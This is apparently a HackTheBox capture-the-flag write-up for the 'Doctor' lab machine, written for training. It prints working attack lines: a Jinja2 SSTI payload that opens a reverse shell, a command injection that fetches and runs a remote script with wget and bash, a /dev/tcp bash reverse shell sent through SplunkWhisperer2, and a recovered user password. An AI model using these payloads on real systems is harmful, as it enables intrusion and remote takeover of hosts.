---
title: "HackTheBox — Doctor Writeup"
date: 2021-01-15 12:30:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, doctor, ctf, splunk, nmap, flask, ssti, command-injection, curl, bash, adm, Splunkwhisperer2]
image: /assets/img/Posts/Doctor.png
---

> Doctor starts off with attacking a health service message board website where we discover two vulnerabilities, Server-side Template injection and Command injection both of which leads to initial foothold on the box. Next we discover the user has privileges to read logs, where we find a password sent over password reset url, resulting in gaining access to next user. For elevating privileges to root we exploit the Splunk Atom feed service using SplunkWhisperer2 to obtain root shell.

## Reconnaissance

Initial port scan using `masscan` & `nmap` discovers three TCP ports 22, 80, 8089

#### masscan

```shell
cfx:  ~/Documents/htb/doctor
→ masscan -e tun0 -p1-65535,u:1-65535 --rate 500 10.10.10.209 | tee masscan.ports

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-14 09:05:39 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.209
Discovered open port 80/tcp on 10.10.10.209
Discovered open port 8089/tcp on 10.10.10.209
```
#### nmap

```shell
cfx:  ~/Documents/htb/doctor
→ nmap -sC -sV -p22,80,8089 10.10.10.209
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-14 16:37 IST
Nmap scan report for 10.10.10.209
Host is up (0.076s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.88 seconds
```

Port Scan Summary:

- Port 22 - SSH
- Port 80 - HTTP Website
- Port 8089 - Splunkd

### Port 8089 - Splunkd

Visiting <http://10.10.10.209:8089> we see it's an Splunk Management page running Splunk Version as 8.0.5, apart from it we don't find anything interesting since visiting the management options request basic HTTP AUTH and we don't have any creds. So we can look into it later once we obtain some valid credential.

![splunk](/assets/img/Posts/Doctor/splunk.png)

### Port 80 - HTTP

Visiting <http://10.10.10.209> we get presented with a health services website. While the links on the website are non functional we do see a note for sending message to **info@doctors.htb**

![website](/assets/img/Posts/Doctor/website.png)

Adding doctors.htb to `/etc/hosts` and visiting <http://doctors.htb> redirects us to **Doctor Secure Messaging** login page located at `doctors.htb/login?next=%2F`

![portal](/assets/img/Posts/Doctor/portal.png)

Basic SQLi didn't work but we have a sign up option which allows us to create a account which is valid for 20 minutes.

Once logged in we see a empty page with some options to play around with:

![portal1](/assets/img/Posts/Doctor/portal1.png)

Interestingly **New Message** presents a form with Title and Content field, once filled and posted it appears on the home page:

![portal2](/assets/img/Posts/Doctor/portal2.png)

Visiting the source of the page we see an HTML comment referring to `/archive` which is in beta testing:

```html
<div class="navbar-nav mr-auto">
              <a class="nav-item nav-link" href="/home">Home</a>
              <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
            </div>
            <!-- Navbar Right Side -->
            <div class="navbar-nav">

                <a class="nav-item nav-link" href="/post/new">New Message</a>
                <a class="nav-item nav-link" href="/account">Account</a>
                <a class="nav-item nav-link" href="/logout">Logout</a>
```
Looking at the source of <http://doctors.htb/archive> we see the Post title in the XML content:

![archive1](/assets/img/Posts/Doctor/archive1.png)

## Shell as web

### Method 1: SSTI

> Server-Side Template Injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server. If you happen to view the source of a web page and see below code snippets then it is safe to guess that the application is using some template engine to render data.

Looking at Wappalyzer output we can see it's running Python framework - Flask which uses Jinja2 template engine by default which can be vulnerable to SSTI.

![wapp](/assets/img/Posts/Doctor/wapp.png)

I found this [**medium article**](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee) which explains in detail on testing and exploiting SSTI.

#### Testing SSTI

PayloadsAllTheThings has a good image on methodology for testing SSTI:

![ssti](/assets/img/Posts/Doctor/ssti.png)

For testing we'll include payload inside both title and content to see how the site responds, unfortunately we don't see anything like 49 or 4 on first attempt:

![ssti1](/assets/img/Posts/Doctor/ssti1.png)

Second attempt didn't work either:

![ssti2](/assets/img/Posts/Doctor/ssti2.png)

Going nowhere I stumbled upon the archive page again where we can see something really interesting:

![ssti3](/assets/img/Posts/Doctor/ssti3.png)

Apparently our SSTI did work for payloads `{{4*4}}` and `{{7*'7'}}` which confirms the template engine running is either Jinja2 which is the default engine for Flask or it can Twig.

#### Reverse Shell

Now that we are certain of SSTI we can grab the [**remote code execution payload**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset) from PayloadsAllTheThings and modify it with our IP/Port and changing the subprocess call to `/bin/bash -i` to drop us a reverse shell:

Inputting the below payload inside title and once posted, refreshing the `http://doctors.htb/archive` page drops us a reverse shell:

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.27\",8020));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

![ssti4](/assets/img/Posts/Doctor/ssti4.png)

```shell
cfx:  ~/Documents/htb/doctor
→ nc -lvnp 8020
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8020
Ncat: Listening on 0.0.0.0:8020
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:45930.
bash: cannot set terminal process group (863): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

### Method 2: Command Injection

This is the unintended method to solve the box, originally I did solve the box using this method.

While testing for possible vectors leading to RCE, I was trying random XSS payloads to understand the website response so by sending a HTML injection payload inside the title and XSS payload in the content:

![cmdi](/assets/img/Posts/Doctor/cmdi.png)

While both the payloads reflected as it is inside Posts, XSS payload inside content field did parse and we can observe a hit on the Python server:

```shell
cfx:  ~/Documents/htb/doctor
→ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.209 - - [14/Nov/2020 19:18:32] code 404, message File not found
10.10.10.209 - - [14/Nov/2020 19:18:32] "GET /test HTTP/1.1" 404 -
10.10.10.209 - - [14/Nov/2020 19:20:08] code 404, message File not found
```

Although it's not clear how the request was parsed at this point because the hit on the python server was received instantly as soon as post was submitted without any delay.

To see the complete request, we'll change the port and send the payload again as `<img src="http://10.10.14.27:8080/test" onerror=alert(1)>` and observe the request on the nc listener:

```
cfx:  ~/Documents/htb/doctor
→ nc -lvnp 8080
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:32800.
GET /test HTTP/1.1
Host: 10.10.14.27:8080
User-Agent: curl/7.68.0
Accept: */*
```
Interestingly, it's showing curl as the User-agent, it appears the content field is parsing the content directly via curl command.

On sending a simple web server link inside the content field we do see the hit again our python server, apparently there is no input validation and the content are directly parsed via Curl:

![cmdi1](/assets/img/Posts/Doctor/cmdi1.png)

```shell
cfx:  ~/Documents/htb/doctor
→ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.209 - - [14/Nov/2020 19:53:22] code 404, message File not found
10.10.10.209 - - [14/Nov/2020 19:53:22] "GET /cfx HTTP/1.1" 404 -
```

#### RCE test

Next, We'll craft our payload as `http://10.10.14.27/$(whoami)` and submit the post again, instantly we see username as web:

```shell
10.10.10.209 - - [14/Nov/2020 19:56:50] "GET /web HTTP/1.1" 404 -
```

Changing the payload to `http://10.10.14.27/$(hostname)` resulted in giving the hostname as doctor:

```shell
10.10.10.209 - - [14/Feb/2021 19:58:04] "GET /doctor HTTP/1.1" 404 -
```

#### Reverse Shell - Web

Now that we have a working RCE, our next goal should be to get a reverse shell.

Although there are certain limitations to this method as sending complex reverse shell payloads was breaking the request as the payload didn't like space so we have to use `$IFS` (Internal field separator) and we have to combine arguments with `'`

So instead of writing complex payloads, I decided to host a python3 reverse shell payload on the python server and call the reverse shell payload using wget and next run the script using bash:

- Reverse shell payload:

```shell
cfx:  ~/Documents/htb/doctor
→ cat rev.bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",8021));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

- Payload for Command Injection:

```shell
http://10.10.14.27/$(wget$IFS'http://10.10.14.27/rev.bash'$IFS;$IFS'bash'$IFS'rev.bash')
```
This payload will fetch our python reverse shell file `rev.bash` and separated by `;` next command will execute dropping a reverse shell.

![rce](/assets/img/Posts/Doctor/rce.png)

On submitting the Post, we can see a hit on python server:

```shell
10.10.10.209 - - [14/Nov/2020 20:16:38] "GET /rev.bash HTTP/1.1" 200 -
```

And get a call back on our nc listener:

```shell
cfx:  ~/Documents/htb/doctor
→ nc -lvnp 8021
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8021
Ncat: Listening on 0.0.0.0:8021
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:55492.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
$ python3 -c "import pty;pty.spawn('/bin/bash')"
web@doctor:~$
```

## Elevating Priv: web -> shaun

### Enumeration

Inside home directory we discover another user named shaun:

```shell
web@doctor:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root  root  4096 Sep 19 16:54 .
drwxr-xr-x 20 root  root  4096 Sep 15 12:51 ..
drwxr-xr-x  6 shaun shaun 4096 Sep 15 12:51 shaun
drwxr-xr-x  7 web   web   4096 Feb 14 16:47 web
```

`user.txt` is located inside shaun's home directory and is only readable by shaun.

Next we find, Web user is a member of `adm` group which allows us to read log files in `/var/log/` directory:

```shell
web@doctor:~$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

Going through the apache2 log files, we will grep for password where we discover a password `Guitar123`:

```shell
web@doctor:/var/log/apache2$ grep -r password
grep -r password
backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

### Su - shaun

Turns out `Guitar123` is shaun's password:

```shell
web@doctor:/home/shaun$ su shaun
Password: Guitar123
shaun@doctor:~$
```

Grabbing `user.txt`:

```shell
shaun@doctor:~$ cat user.txt
8bb491643e3fe3******************
```

## Elevating Priv: shaun -> root

Initial enumeration did reveal a splunkd service hosted on Port 8089 running version 8.0.5

On searching for Splunk Privilege escalation exploit we stumble upon [**SplunkWhisperer2**](https://github.com/cnotin/SplunkWhisperer2) using which we can achieve privilege escalation or remote code execution

### Root shell

We'll clone the repo on our machine and run the Python script along with shaun's creds:

```shell
cfx:  ~/Documents/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2  |master ✓|
→ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.27 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.27/4444 0>&1'"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpq0qs909h.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.27:8181/
10.10.10.209 - - [14/Nov/2020 21:48:42] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

[.] Removing app...
[+] App removed
[+] Stopped HTTP server
Bye!
```

Getting a callback on `nc` listener:

```shell
cfx:  ~/Documents/htb/doctor
→ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:42392.
bash: cannot set terminal process group (1143): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# id
uid=0(root) gid=0(root) groups=0(root)
root@doctor:/# whoami
root
```

Grabbing `root.txt`

```shell
root@doctor:/root# cat root.txt
5df27170d99d58b*****************

```

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
